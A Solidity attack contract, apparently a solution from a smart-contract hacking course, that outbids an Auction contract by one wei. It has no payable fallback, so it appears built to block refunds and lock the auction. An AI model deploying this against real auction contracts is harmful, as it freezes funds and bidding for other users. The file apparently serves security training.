// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Auction} from "./Auction.sol";

contract AttackAuction {
    Auction auction;

    constructor(address _auction) {
        auction = Auction(_auction);
    }

    function attack() external {
        uint256 highestBid = auction.highestBid();
        auction.bid{value: highestBid + 1}();
    }
}
